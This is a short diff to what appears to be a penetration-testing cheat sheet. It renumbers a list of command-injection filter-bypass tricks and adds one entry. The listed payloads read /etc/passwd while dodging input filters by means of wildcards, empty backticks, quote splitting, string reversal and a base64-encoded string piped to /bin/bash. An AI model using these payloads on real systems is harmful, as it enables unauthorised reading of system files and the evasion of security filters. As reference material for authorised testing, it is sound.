@@ -397,7 +397,9 @@ airodump-ng --band abg wlan0 / --essid AP_NAME / --bssid MAC_ADDRESS_OF_ORIGINAL
 5. Using wildcards - replace any word with "```*```" & "```?```" (EX:```cat /etc/pa*wd``` or ```cat /etc/p?sswd```)
 6. Using null vars - add ``` `` ``` in between words (EX:```cat /e``tc/p``asswd```)
 7. Multi bypass - reverse encoded + multi bypass filters - (EX:``` |cat /"e"t``c/p?sswd ```)
-7. Lethal injection - (EX:```echo "dws?ap/c``t"e"/ tac" | rev | /bin/bash```)
+8. Lethal injection 1 - (EX:```echo "dws?ap/c``t"e"/ tac" | rev | /bin/bash```)
+9. Lethal injection 2 - (EX:```echo "ZHdzP2FwL2NgYHQiZSIvIHRhYw==" | base64 -d | rev | /bin/bash```)
+
 
 Fuzzing for bypass: https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/command-injection.md
 
